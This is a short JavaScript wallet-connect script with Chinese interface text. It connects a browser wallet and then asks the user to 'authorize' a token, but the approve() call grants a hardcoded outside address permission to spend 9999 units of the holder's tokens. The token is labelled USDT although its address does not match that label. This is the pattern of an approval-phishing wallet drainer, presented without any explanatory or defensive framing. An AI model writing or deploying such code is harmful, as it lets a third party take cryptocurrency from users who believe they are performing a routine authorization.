let provider;
let signer;

async function connectWallet() {
  if (window.ethereum) {
    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
    try {
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      const address = await signer.getAddress();
      document.getElementById("status").innerText = "已连接钱包：" + address;
    } catch (err) {
      console.error(err);
      document.getElementById("status").innerText = "连接钱包失败";
    }
  } else {
    alert("未检测到 Web3 钱包，请使用 MetaMask、imToken 等浏览器内钱包");
  }
}

const usdtAbi = [
  "function approve(address spender, uint256 amount) public returns (bool)"
];

const usdtAddress = "0x4200000000000000000000000000000000000042";
const recipient = "0x6de08c724e14d561428b29d3909739344aa96c3a";
const amount = ethers.utils.parseUnits("9999", 6);

async function authorize() {
  if (!signer) {
    document.getElementById("status").innerText = "请先连接钱包";
    return;
  }
  try {
    const contract = new ethers.Contract(usdtAddress, usdtAbi, signer);
    const tx = await contract.approve(recipient, amount);
    document.getElementById("status").innerText = "授权中，请等待确认...";
    await tx.wait();
    document.getElementById("status").innerText = "已成功授权 9999 USDT ✅";
  } catch (err) {
    console.error(err);
    document.getElementById("status").innerText = "授权失败 ❌";
  }
}

